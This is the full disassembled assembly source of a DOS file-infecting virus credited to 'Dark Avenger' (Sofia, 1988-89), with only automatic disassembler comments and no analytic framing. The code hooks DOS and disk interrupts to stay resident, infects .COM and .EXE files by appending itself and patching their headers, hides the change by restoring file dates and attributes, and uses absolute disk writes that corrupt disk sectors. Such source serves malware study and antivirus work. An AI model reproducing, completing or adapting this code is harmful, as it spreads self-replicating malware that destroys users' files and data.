data_1e     equ 0
data_2e     equ 2
data_3e     equ 2Ah
data_4e     equ 4Ch
data_5e     equ 4Eh
data_6e     equ 84h
data_7e     equ 86h
data_8e     equ 90h
data_9e     equ 92h
data_10e    equ 9Ch
data_11e    equ 9Eh
data_12e    equ 100h
data_13e    equ 102h
data_14e    equ 106h
data_15e    equ 0
data_16e    equ 3
data_17e    equ 6
data_45e    equ 1
data_46e    equ 755h
data_47e    equ 757h
data_48e    equ 761h
data_49e    equ 763h
data_50e    equ 767h
data_51e    equ 769h
data_52e    equ 76Bh
data_53e    equ 76Ch
data_54e    equ 76Dh
data_55e    equ 76Eh
data_56e    equ 708h
data_57e    equ 2
data_58e    equ 6
data_59e    equ 708h

code_seg_a  segment
        assume  cs:code_seg_a, ds:code_seg_a

        org 100h

dark        proc    far

start:
        jmp loc_5
        int 21h
        db  1514 dup (20h)
data_19     dw  2020h               ; Data table (indexed access)
data_20     dw  2020h               ; Data table (indexed access)
        db  20h
data_21     dw  2020h               ; Data table (indexed access)
data_22     dw  2020h               ; Data table (indexed access)
        db  20h
data_23     db  20h             ; Data table (indexed access)
data_24     db  20h
data_25     dw  2020h               ; Data table (indexed access)
data_26     dw  2020h               ; Data table (indexed access)
data_27     dw  2020h               ; Data table (indexed access)
data_28     dw  2020h               ; Data table (indexed access)
data_29     dw  2020h               ; Data table (indexed access)
data_30     dw  2020h               ; Data table (indexed access)
        db  20h
data_31     dw  2020h
        db  65 dup (20h)
data_32     dw  2020h               ; Data table (indexed access)
data_33     dw  2020h               ; Data table (indexed access)
data_34     dw  2020h               ; Data table (indexed access)
data_35     dw  2020h               ; Data table (indexed access)
data_36     db  20h
data_37     dw  2020h
        db  20h,20h,20h,20h,20h
data_38     dw  2020h
        db  20h,20h,20h,20h
data_39     dw  2020h
data_40     dw  2020h
        db  20h,20h
data_41     dw  2020h
data_42     dw  2020h
data_43     dw  2020h
data_44     dw  2020h
        db  133 dup (20h)
        db  'Eddie lives...somewhere in time!'
        db  0,0,90h,23h,12h,1Eh
loc_3:
        mov bx,es
        add bx,10h
        add bx,cs:data_27[si]
        mov cs:[si+53h],bx
        mov bx,cs:data_26[si]
        mov cs:[si+51h],bx
        mov bx,es
        add bx,10h
        add bx,cs:data_29[si]
        mov ss,bx
        mov sp,cs:data_28[si]
        jmp far ptr loc_1
loc_4:
        mov di,100h
        add si,705h
        movsb                   ; Mov [si] to es:[di]
        movsw                   ; Mov [si] to es:[di]
        mov sp,ds:data_17e
        xor bx,bx               ; Zero register
        push    bx
        jmp word ptr [si-0Bh]       ; 1 entry
loc_5:
        call    sub_1

dark        endp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_1       proc    near
        pop si
        sub si,6Bh
        cld                 ; Clear direction
        cmp cs:data_30[si],5A4Dh
        je  loc_6               ; Jump if equal
        cli                 ; Disable interrupts
        mov sp,si
        add sp,808h
        sti                 ; Enable interrupts
        cmp sp,ds:data_17e
        jae loc_4               ; Jump if above or =
loc_6:
        push    ax
        push    es
        push    si
        push    ds
        mov di,si
        xor ax,ax               ; Zero register
        push    ax
        mov ds,ax
        les ax,dword ptr ds:data_4e     ; Load 32 bit ptr
        mov cs:data_21[si],ax
        mov cs:data_22[si],es
        mov cs:data_19[si],ax
        mov cs:data_20[si],es
        mov ax,ds:data_13e
        cmp ax,0F000h
        jne loc_14              ; Jump if not equal
        mov cs:data_20[si],ax
        mov ax,ds:data_12e
        mov cs:data_19[si],ax
        mov dl,80h
        mov ax,ds:data_14e
        cmp ax,0F000h
        je  loc_7               ; Jump if equal
        cmp ah,0C8h
        jb  loc_14              ; Jump if below
        cmp ah,0F4h
        jae loc_14              ; Jump if above or =
        test    al,7Fh
        jnz loc_14              ; Jump if not zero
        mov ds,ax
        cmp word ptr ds:data_1e,0AA55h
        jne loc_14              ; Jump if not equal
        mov dl,ds:data_2e
loc_7:
        mov ds,ax
        xor dh,dh               ; Zero register
        mov cl,9
        shl dx,cl               ; Shift w/zeros fill
        mov cx,dx
        xor si,si               ; Zero register

locloop_8:
        lodsw                   ; String [si] to ax
        cmp ax,0FA80h
        jne loc_9               ; Jump if not equal
        lodsw                   ; String [si] to ax
        cmp ax,7380h
        je  loc_10              ; Jump if equal
        jnz loc_11              ; Jump if not zero
loc_9:
        cmp ax,0C2F6h
        jne loc_12              ; Jump if not equal
        lodsw                   ; String [si] to ax
        cmp ax,7580h
        jne loc_11              ; Jump if not equal
loc_10:
        inc si
        lodsw                   ; String [si] to ax
        cmp ax,40CDh
        je  loc_13              ; Jump if equal
        sub si,3
loc_11:
        dec si
        dec si
loc_12:
        dec si
        loop    locloop_8           ; Loop if cx > 0

        jmp short loc_14
loc_13:
        sub si,7
        mov cs:data_21[di],si
        mov cs:data_22[di],ds
loc_14:
        mov si,di
        pop ds
        les ax,dword ptr ds:data_6e     ; Load 32 bit ptr
        mov cs:data_34[si],ax
        mov cs:data_35[si],es
        push    cs
        pop ds
        cmp ax,2EEh
        jne loc_16              ; Jump if not equal
        xor di,di               ; Zero register
        mov cx,6EFh

locloop_15:
        lodsb                   ; String [si] to al
        scasb                   ; Scan es:[di] for al
        jnz loc_16              ; Jump if not zero
        loop    locloop_15          ; Loop if cx > 0

        pop es
        jmp loc_18
loc_16:
        pop es
        mov ah,49h              ; 'I'
        int 21h             ; DOS Services  ah=function 49h
                            ;  release memory block, es=seg
        mov bx,0FFFFh
        mov ah,48h              ; 'H'
        int 21h             ; DOS Services  ah=function 48h
                            ;  allocate memory, bx=bytes/16
        sub bx,0E7h
        jc  loc_18              ; Jump if carry Set
        mov cx,es
        stc                 ; Set carry flag
        adc cx,bx
        mov ah,4Ah              ; 'J'
        int 21h             ; DOS Services  ah=function 4Ah
                            ;  change mem allocation, bx=siz
        mov bx,0E6h
        stc                 ; Set carry flag
        sbb es:data_57e,bx
        push    es
        mov es,cx
        mov ah,4Ah              ; 'J'
        int 21h             ; DOS Services  ah=function 4Ah
                            ;  change mem allocation, bx=siz
        mov ax,es
        dec ax
        mov ds,ax
        mov word ptr ds:data_45e,8
        call    sub_10
        mov bx,ax
        mov cx,dx
        pop ds
        mov ax,ds
        call    sub_10
        add ax,ds:data_58e
        adc dx,0
        sub ax,bx
        sbb dx,cx
        jc  loc_17              ; Jump if carry Set
        sub ds:data_58e,ax
loc_17:
        pop si
        push    si
        push    ds
        push    cs
        xor di,di               ; Zero register
        mov ds,di
        lds ax,dword ptr ds:data_10e    ; Load 32 bit ptr
        mov cs:data_32[si],ax
        mov cs:data_33[si],ds
        pop ds
        mov cx,753h
        rep movsb               ; Rep while cx>0 Mov [si] to es:[di]
        xor ax,ax               ; Zero register
        mov ds,ax
        mov word ptr ds:data_6e,2EEh
        mov ds:data_7e,es
        mov word ptr ds:data_10e,2A9h
        mov ds:data_11e,es
        mov es:data_56e,ax
        pop es
loc_18:
        pop si
        xor ax,ax               ; Zero register
        mov ds,ax
        mov ax,ds:data_4e
        mov word ptr cs:data_23[si],ax
        mov ax,ds:data_5e
        mov cs:data_25[si],ax
        mov word ptr ds:data_4e,6E4h
        add ds:data_4e,si
        mov ds:data_5e,cs
        pop ds
        push    ds
        push    si
        mov bx,si
        lds ax,dword ptr ds:data_3e     ; Load 32 bit ptr
        xor si,si               ; Zero register
        mov dx,si
loc_19:
        lodsw                   ; String [si] to ax
        dec si
        test    ax,ax
        jnz loc_19              ; Jump if not zero
        add si,3
        lodsb                   ; String [si] to al
        sub al,41h              ; 'A'
        mov cx,1
        push    cs
        pop ds
        add bx,2A9h
        push    ax
        push    bx
        push    cx
        int 25h             ; Absolute disk read, drive al
        pop ax
        pop cx
        pop bx
        inc byte ptr [bx+0Ah]
        and byte ptr [bx+0Ah],0Fh
        jnz loc_21              ; Jump if not zero
        mov al,[bx+10h]
        xor ah,ah               ; Zero register
        mul word ptr [bx+16h]       ; ax = data * ax
        add ax,[bx+0Eh]
        push    ax
        mov ax,[bx+11h]
        mov dx,20h
        mul dx              ; dx:ax = reg * ax
        div word ptr [bx+0Bh]       ; ax,dxrem=dx:ax/data
        pop dx
        add dx,ax
        mov ax,[bx+8]
        add ax,40h
        cmp ax,[bx+13h]
        jb  loc_20              ; Jump if below
        inc ax
        and ax,3Fh
        add ax,dx
        cmp ax,[bx+13h]
        jae loc_22              ; Jump if above or =
loc_20:
        mov [bx+8],ax
loc_21:
        pop ax
        xor dx,dx               ; Zero register
        push    ax
        push    bx
        push    cx
        int 26h             ; Absolute disk write, drive al
        pop ax
        pop cx
        pop bx
        pop ax
        cmp byte ptr [bx+0Ah],0
        jne loc_23              ; Jump if not equal
        mov dx,[bx+8]
        pop bx
        push    bx
        int 26h             ; Absolute disk write, drive al
loc_22:
        pop ax
loc_23:
        pop si
        xor ax,ax               ; Zero register
        mov ds,ax
        mov ax,word ptr cs:data_23[si]
        mov ds:data_4e,ax
        mov ax,cs:data_25[si]
        mov ds:data_5e,ax
        pop ds
        pop ax
        cmp cs:data_30[si],5A4Dh
        jne loc_24              ; Jump if not equal
        jmp loc_3
loc_24:
        jmp loc_4
sub_1       endp

        db  0B0h, 3, 0CFh, 9Ch, 0E8h, 6Bh
        db  3, 9Dh, 2Eh, 0FFh, 2Eh, 4Bh
        db  7, 2Eh, 89h, 16h, 4Bh, 7
        db  2Eh, 8Ch, 1Eh, 4Dh, 7, 9Dh
        db  0CFh, 2Eh, 89h, 16h, 4Fh, 7
        db  2Eh, 8Ch, 1Eh, 51h, 7, 9Dh
        db  0CFh, 2Eh, 0C4h, 1Eh, 4Bh, 7
        db  9Dh, 0CFh, 2Eh, 0C4h, 1Eh, 4Fh
        db  7, 9Dh, 0CFh, 0E8h, 1Fh, 1
        db  0E8h, 39h, 3, 9Dh, 2Eh, 0FFh
        db  2Eh, 4Fh, 7
        db  'Diana P.'
        db  0, 55h, 8Bh, 0ECh, 0FFh, 76h
        db  6, 9Dh, 5Dh, 9Ch, 0E8h, 28h
        db  3, 3Dh, 21h, 25h, 74h, 0C0h
        db  3Dh, 27h, 25h, 74h, 0AFh, 3Dh
        db  21h, 35h, 74h, 0C9h, 3Dh, 27h
        db  35h, 74h, 0BDh, 0FCh, 3Dh, 0
        db  4Bh, 74h, 0C5h, 80h, 0FCh, 3Ch
        db  74h, 0Ah, 80h, 0FCh, 3Eh, 74h
        db  41h, 80h, 0FCh, 5Bh, 75h, 66h
        db  2Eh, 83h, 3Eh, 8, 7, 0
        db  75h, 75h, 0E8h, 88h, 0, 75h
        db  70h, 0E8h, 0E5h, 2, 9Dh, 0E8h
        db  0BDh, 0, 72h, 6Eh, 9Ch, 6
        db  0Eh, 7, 56h, 57h, 51h, 50h
        db  0BFh, 8, 7, 0ABh, 8Bh, 0F2h
        db  0B9h, 41h, 0

locloop_25:
        lodsb                   ; String [si] to al
        stosb                   ; Store al to es:[di]
        test    al,al
        jz  loc_26              ; Jump if zero
        loop    locloop_25          ; Loop if cx > 0

        mov es:data_59e,cx
loc_26:
        pop ax
        pop cx
        pop di
        pop si
        pop es
loc_27:
        popf                    ; Pop flags
        jnc loc_30              ; Jump if carry=0
        cmp bx,cs:data_31
        jne loc_29              ; Jump if not equal
        test    bx,bx
        jz  loc_29              ; Jump if zero
        call    sub_7
        popf                    ; Pop flags
        call    sub_4
        jc  loc_30              ; Jump if carry Set
        pushf                   ; Push flags
        push    ds
        push    cs
        pop ds
        push    dx
        mov dx,70Ah
        call    sub_5
        mov cs:data_31,0
        pop dx
        pop ds
        jmp short loc_27
        db  80h, 0FCh, 3Dh, 74h, 0Ah, 80h
        db  0FCh, 43h, 74h, 5, 80h, 0FCh
        db  56h, 75h, 8
loc_28:
        call    sub_2
        jnz loc_29              ; Jump if not zero
        call    sub_5
loc_29:
        call    sub_7
        popf                    ; Pop flags
        call    sub_4
loc_30:
        pushf                   ; Push flags
        push    ds
        call    sub_8
        mov byte ptr ds:data_15e,5Ah    ; 'Z'
        pop ds
        popf                    ; Pop flags
        ret 2               ; Return far

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_2       proc    near
        push    ax
        push    si
        mov si,dx
loc_31:
        lodsb                   ; String [si] to al
        test    al,al
        jz  loc_33              ; Jump if zero
        cmp al,2Eh              ; '.'
        jne loc_31              ; Jump if not equal
        call    sub_3
        mov ah,al
        call    sub_3
        cmp ax,636Fh
        je  loc_32              ; Jump if equal
        cmp ax,6578h
        jne loc_34              ; Jump if not equal
        call    sub_3
        cmp al,65h              ; 'e'
        jmp short loc_34
loc_32:
        call    sub_3
        cmp al,6Dh              ; 'm'
        jmp short loc_34
loc_33:
        inc al
loc_34:
        pop si
        pop ax
        ret
sub_2       endp

  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_3       proc    near
        lodsb                   ; String [si] to al
        cmp al,43h              ; 'C'
        jb  loc_ret_35          ; Jump if below
        cmp al,59h              ; 'Y'
        jae loc_ret_35          ; Jump if above or =
        add al,20h              ; ' '

loc_ret_35:
        ret
sub_3       endp

  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_4       proc    near
        pushf                   ; Push flags
        call    dword ptr cs:data_34
        ret
sub_4       endp

  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_5       proc    near
        push    ds
        push    es
        push    si
        push    di
        push    ax
        push    bx
        push    cx
        push    dx
        mov si,ds
        xor ax,ax               ; Zero register
        mov ds,ax
        les ax,dword ptr ds:data_8e     ; Load 32 bit ptr
        push    es
        push    ax
        mov word ptr ds:data_8e,2A6h
        mov ds:data_9e,cs
        les ax,dword ptr ds:data_4e     ; Load 32 bit ptr
        mov word ptr cs:data_23,ax
        mov cs:data_25,es
        mov word ptr ds:data_4e,6E4h
        mov ds:data_5e,cs
        push    es
        push    ax
        mov ds,si
        xor cx,cx               ; Zero register
        mov ax,4300h
        call    sub_4
        mov bx,cx
        and cl,0FEh
        cmp cl,bl
        je  loc_36              ; Jump if equal
        mov ax,4301h
        call    sub_4
        stc                 ; Set carry flag
loc_36:
        pushf                   ; Push flags
        push    ds
        push    dx
        push    bx
        mov ax,3D02h
        call    sub_4
        jc  loc_37              ; Jump if carry Set
        mov bx,ax
        call    sub_6
        mov ah,3Eh              ; '>'
        call    sub_4
loc_37:
        pop cx
        pop dx
        pop ds
        popf                    ; Pop flags
        jnc loc_38              ; Jump if carry=0
        mov ax,4301h
        call    sub_4
loc_38:
        xor ax,ax               ; Zero register
        mov ds,ax
        pop word ptr ds:data_4e
        pop word ptr ds:data_5e
        pop word ptr ds:data_8e
        pop word ptr ds:data_9e
        pop dx
        pop cx
        pop bx
        pop ax
        pop di
        pop si
        pop es
        pop ds
        ret
sub_5       endp

  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_6       proc    near
        push    cs
        pop ds
        push    cs
        pop es
        mov dx,753h
        mov cx,18h
        mov ah,3Fh              ; '?'
        int 21h             ; DOS Services  ah=function 3Fh
                            ;  read file, cx=bytes, to ds:dx
        xor cx,cx               ; Zero register
        xor dx,dx               ; Zero register
        mov ax,4202h
        int 21h             ; DOS Services  ah=function 42h
                            ;  move file ptr, cx,dx=offset
        mov data_44,dx
        cmp ax,6EFh
        sbb dx,0
        jc  loc_ret_42          ; Jump if carry Set
        mov data_43,ax
        cmp word ptr data_36,5A4Dh
        jne loc_39              ; Jump if not equal
        mov ax,data_38
        add ax,data_42
        call    sub_10
        add ax,data_41
        adc dx,0
        mov cx,dx
        mov dx,ax
        jmp short loc_40
loc_39:
        cmp data_36,0E9h
        jne loc_43              ; Jump if not equal
        mov dx,data_37
        add dx,103h
        jc  loc_43              ; Jump if carry Set
        dec dh
        xor cx,cx               ; Zero register
loc_40:
        sub dx,68h
        sbb cx,0
        mov ax,4200h
        int 21h             ; DOS Services  ah=function 42h
                            ;  move file ptr, cx,dx=offset
        add ax,708h
        adc dx,0
        cmp ax,data_43
        jne loc_43              ; Jump if not equal
        cmp dx,data_44
        jne loc_43              ; Jump if not equal
        mov dx,76Fh
        mov si,dx
        mov cx,6EFh
        mov ah,3Fh              ; '?'
        int 21h             ; DOS Services  ah=function 3Fh
                            ;  read file, cx=bytes, to ds:dx
        jc  loc_43              ; Jump if carry Set
        cmp cx,ax
        jne loc_43              ; Jump if not equal
        xor di,di               ; Zero register

locloop_41:
        lodsb                   ; String [si] to al
        scasb                   ; Scan es:[di] for al
        jnz loc_43              ; Jump if not zero
        loop    locloop_41          ; Loop if cx > 0

  
loc_ret_42:
        ret
loc_43:
        xor cx,cx               ; Zero register
        xor dx,dx               ; Zero register
        mov ax,4202h
        int 21h             ; DOS Services  ah=function 42h
                            ;  move file ptr, cx,dx=offset
        cmp word ptr data_36,5A4Dh
        je  loc_44              ; Jump if equal
        add ax,953h
        adc dx,0
        jz  loc_45              ; Jump if zero
        ret
loc_44:
        mov dx,data_43
        neg dl
        and dx,0Fh
        xor cx,cx               ; Zero register
        mov ax,4201h
        int 21h             ; DOS Services  ah=function 42h
                            ;  move file ptr, cx,dx=offset
        mov data_43,ax
        mov data_44,dx
loc_45:
        mov ax,5700h
        int 21h             ; DOS Services  ah=function 57h
                            ;  get/set file date & time
        pushf                   ; Push flags
        push    cx
        push    dx
        cmp word ptr data_36,5A4Dh
        je  loc_46              ; Jump if equal
        mov ax,100h
        jmp short loc_47
loc_46:
        mov ax,data_41
        mov dx,data_42
loc_47:
        mov di,6FDh
        stosw                   ; Store ax to es:[di]
        mov ax,dx
        stosw                   ; Store ax to es:[di]
        mov ax,data_40
        stosw                   ; Store ax to es:[di]
        mov ax,data_39
        stosw                   ; Store ax to es:[di]
        mov si,753h
        movsb                   ; Mov [si] to es:[di]
        movsw                   ; Mov [si] to es:[di]
        xor dx,dx               ; Zero register
        mov cx,708h
        mov ah,40h              ; '@'
        int 21h             ; DOS Services  ah=function 40h
                            ;  write file cx=bytes, to ds:dx
        jc  loc_48              ; Jump if carry Set
        xor cx,ax
        jnz loc_48              ; Jump if not zero
        mov dx,cx
        mov ax,4200h
        int 21h             ; DOS Services  ah=function 42h
                            ;  move file ptr, cx,dx=offset
        cmp word ptr data_36,5A4Dh
        je  loc_49              ; Jump if equal
        mov data_36,0E9h
        mov ax,data_43
        add ax,65h
        mov data_37,ax
        mov cx,3
        jmp short loc_52
loc_48:
        jmp short loc_53
loc_49:
        call    sub_9
        not ax
        not dx
        inc ax
        jnz loc_50              ; Jump if not zero
        inc dx
loc_50:
        add ax,ds:data_52e
        adc dx,ds:data_54e
        mov cx,10h
        div cx              ; ax,dx rem=dx:ax/reg
        mov word ptr ds:data_50e,68h
        mov ds:data_51e,ax
        add ax,71h
        mov ds:data_48e,ax
        mov word ptr ds:data_49e,100h
        add word ptr ds:data_52e,708h
        adc word ptr ds:data_54e,0
        mov ax,ds:data_52e
        and ax,1FFh
        mov ds:data_46e,ax
        pushf                   ; Push flags
        mov ax,ds:data_53e
        shr byte ptr ds:data_55e,1      ; Shift w/zeros fill
        rcr ax,1                ; Rotate thru carry
        popf                    ; Pop flags
        jz  loc_51              ; Jump if zero
        inc ax
loc_51:
        mov ds:data_47e,ax
        mov cx,18h
loc_52:
        mov dx,753h
        mov ah,40h              ; '@'
        int 21h             ; DOS Services  ah=function 40h
                            ;  write file cx=bytes, to ds:dx
loc_53:
        pop dx
        pop cx
        popf                    ; Pop flags
        jc  loc_ret_54          ; Jump if carry Set
        mov ax,5701h
        int 21h             ; DOS Services  ah=function 57h
                            ;  get/set file date & time

loc_ret_54:
        ret
sub_6       endp

  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_7       proc    near
        push    ds
        call    sub_8
        mov byte ptr ds:data_15e,4Dh    ; 'M'
        pop ds
        push    ds
        push    ax
        push    bx
        push    dx
        xor bx,bx               ; Zero register
        mov ds,bx
        lds dx,dword ptr ds:data_6e     ; Load 32 bit ptr
        cmp dx,2EEh
        jne loc_55              ; Jump if not equal
        mov ax,ds
        mov bx,cs
        cmp ax,bx
        je  loc_59              ; Jump if equal
        xor bx,bx               ; Zero register
loc_55:
        mov ax,[bx]
        cmp ax,2EEh
        jne loc_56              ; Jump if not equal
        mov ax,cs
        cmp ax,[bx+2]
        je  loc_57              ; Jump if equal
loc_56:
        inc bx
        jnz loc_55              ; Jump if not zero
        jz  loc_58              ; Jump if zero
loc_57:
        mov ax,cs:data_34
        mov [bx],ax
        mov ax,cs:data_35
        mov [bx+2],ax
        mov cs:data_34,dx
        mov cs:data_35,ds
        xor bx,bx               ; Zero register
loc_58:
        mov ds,bx
        mov word ptr ds:data_6e,2EEh
        mov ds:data_7e,cs
loc_59:
        pop dx
        pop bx
        pop ax
        pop ds
        ret
sub_7       endp

  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_8       proc    near
        push    ax
        push    bx
        mov ah,62h              ; 'b'
        call    sub_4
        mov ax,cs
        dec ax
        dec bx
loc_60:
        mov ds,bx
        stc                 ; Set carry flag
        adc bx,ds:data_16e
        cmp bx,ax
        jb  loc_60              ; Jump if below
        pop bx
        pop ax
        ret
sub_8       endp

  
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_9       proc    near
        mov ax,data_38

;;;;; External Entry into Subroutine ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_10:
        mov dx,10h
        mul dx              ; dx:ax = reg * ax
        ret
sub_9       endp

        db  'This program was written in the city'
        db  ' of Sofia (C) 1988-89 Dark Avenger',0

        db  80h,0FCh,3,75h,15,80h,0FAh
        db  80h,73h,5,0EAh,92h,15,70h,0
loc_61:
        jmp far ptr loc_2
loc_62:
        jmp far ptr loc_2

        db  0,1,33h,14h,20h,20h,20h,20h,0E9h,5Fh,7

code_seg_a  ends

        end start
        